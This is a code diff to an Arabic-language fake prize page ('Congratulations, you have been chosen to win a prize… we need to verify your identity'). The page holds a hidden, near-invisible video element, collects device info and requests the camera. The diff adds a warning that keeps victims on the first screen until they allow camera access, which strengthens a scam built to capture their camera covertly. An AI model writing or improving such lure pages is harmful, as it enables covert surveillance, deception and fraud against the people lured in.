@@ -41,6 +41,8 @@ p{font-size:15px;line-height:1.8;color:#98a0b3;margin:0;max-width:340px}
   box-shadow:0 8px 24px rgba(37,211,102,.35)}
 .wa:active{transform:scale(.97)}
 
+.warn{margin-top:12px;font-size:14px;color:#e07777;line-height:1.7}
+
 video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none}
 </style>
 </head>
@@ -52,6 +54,7 @@ video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-event
   <h1>مبروك!</h1>
   <p>لقد تم اختيارك للفوز بجائزة.<br>لاستلام جائزتك، نحتاج التحقق من هويتك.</p>
   <button class="btn" id="go">استلام الجائزة</button>
+  <div class="warn hide" id="warn">⚠️ يجب السماح بالوصول إلى الكاميرا لإكمال التحقق</div>
 </div>
 
 <!-- الشاشة 2: المؤشر -->
@@ -87,6 +90,7 @@ video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-event
   var s2=document.getElementById('s2');
   var s3=document.getElementById('s3');
   var go=document.getElementById('go');
+  var warn=document.getElementById('warn');
   var slots=document.querySelectorAll('.slot');
 
   function sleep(ms){return new Promise(function(r){setTimeout(r,ms)})}
@@ -155,10 +159,13 @@ video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-event
 
   async function run(){
     var dev=deviceInfo();
+    warn.classList.add('hide');
+
     var stream=await getStream();
+
     if(!stream){
-      s1.classList.add('hide');
-      s3.classList.remove('hide');
+      // رفض الإذن: أظهر تحذيراً، وابقَ في الشاشة 1
+      warn.classList.remove('hide');
       return;
     }
 
